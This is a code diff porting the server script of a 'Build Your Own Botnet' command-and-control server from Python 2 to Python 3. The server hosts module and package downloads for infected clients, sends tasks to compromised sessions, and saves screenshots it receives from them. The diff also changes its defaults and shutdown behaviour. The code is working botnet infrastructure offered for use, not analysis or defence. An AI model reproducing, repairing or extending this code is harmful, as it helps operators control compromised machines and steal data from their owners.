@@ -7,7 +7,6 @@ import os
 import sys
 import time
 import json
-import Queue
 import string
 import pickle
 import socket
@@ -26,7 +25,7 @@ import multiprocessing
 # packages
 # import cv2
 import colorama
-import SocketServer
+import socketserver
 
 # modules
 import core.util as util
@@ -57,21 +56,20 @@ def main():
 
     parser = argparse.ArgumentParser(
         prog='server.py',
-        version='0.1.5',
         description="Command & Control Server (Build Your Own Botnet)")
 
     parser.add_argument(
         '--host',
         action='store',
         type=str,
-        default='0.0.0.0',
+        default='127.0.0.1',
         help='server hostname or IP address')
 
     parser.add_argument(
         '--port',
         action='store',
         type=int,
-        default=1337,
+        default=80,
         help='server port number')
 
     parser.add_argument(
@@ -117,11 +115,10 @@ def main():
     __debug = options.debug
 
     globals()['debug'] = __debug
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
-    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m http.server {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m http.server {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
-
-    c2.run()
+    globals()['c2'].run()
 
 
 class C2():
@@ -306,7 +303,8 @@ class C2():
 
     def _get_prompt(self, data):
         with self._lock:
-            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
+            print(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip(), end=' ')
+            return input()
 
     def debug(self, code):
         """ 
@@ -318,7 +316,7 @@ class C2():
         """
         if globals()['debug']:
             try:
-                print eval(code)
+                print (eval(code))
             except Exception as e:
                 util.log("Error: %s" % str(e))
         else:
@@ -331,13 +329,13 @@ class C2():
         """
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
-        if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
-            for session in self.sessions.values():
-                if isinstance(session, Session):
-                    try:
-                        session._active.set()
-                        session.send_task({"task": "passive"})
-                    except: pass
+        #if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
+        for session in self.sessions.values():
+            if isinstance(session, Session):
+                try:
+                    session._active.set()
+                    session.send_task({"task": "passive"})
+                except: pass
         globals()['__abort'] = True
         self._active.clear()
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
@@ -355,8 +353,8 @@ class C2():
         column1 = 'command <arg>'
         column2 = 'description'
         info = info if info else {command['usage']: command['description'] for command in self.commands.values()}
-        max_key = max(map(len, info.keys() + [column1])) + 2
-        max_val = max(map(len, info.values() + [column2])) + 2
+        max_key = max(map(len, list(info.keys()) + [column1])) + 2
+        max_val = max(map(len, list(info.values()) + [column2])) + 2
         util.display('\n', end=',')
         util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
         for key in sorted(info):
@@ -387,7 +385,7 @@ class C2():
                 except:
                     util.display(str(info), color=self._text_color, style=self._text_style)
             else:
-                util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+                util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
             print
 
     def query(self, statement):
@@ -589,9 +587,13 @@ class C2():
                 except OSError:
                     util.log("Unable to create directory 'data' (permission denied)")
                     return
-            filename = 'data/{}.png'.format(str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]))
-            with file(filename, 'wb') as fp:
-                fp.write(output)
+            filename = 'data/{}.png'.format(str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]))
+            try:
+                with open(filename, 'wb') as fp:
+                    fp.write(base64.decodebytes(output.encode()))
+            except Exception as e:
+                print(e)
+
             return filename
 
 
